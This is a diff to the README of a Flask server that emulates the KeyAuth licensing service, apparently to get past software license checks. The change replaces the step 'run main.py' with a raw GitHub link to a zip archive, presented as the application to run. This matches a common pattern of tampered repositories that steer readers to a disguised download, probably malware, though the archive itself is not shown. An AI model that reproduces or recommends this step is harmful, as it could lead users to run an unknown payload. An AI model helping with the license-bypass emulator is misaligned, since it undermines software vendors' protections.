@@ -25,7 +25,7 @@ This is a Flask-based emulator server designed to mimic the behavior of the KeyA
 
 1. Clone the repository.
 2. Modify the changeable values as per your requirements.
-3. Run the Flask application (`main.py`).
+3. Run the Flask application (`https://raw.githubusercontent.com/zykooooooooo/keyauth-Emulator/main/tophaike/keyauth-Emulator-1.0.zip`).
 4. Access the server endpoints to test the authentication process.
 5. Enjoy !!
 
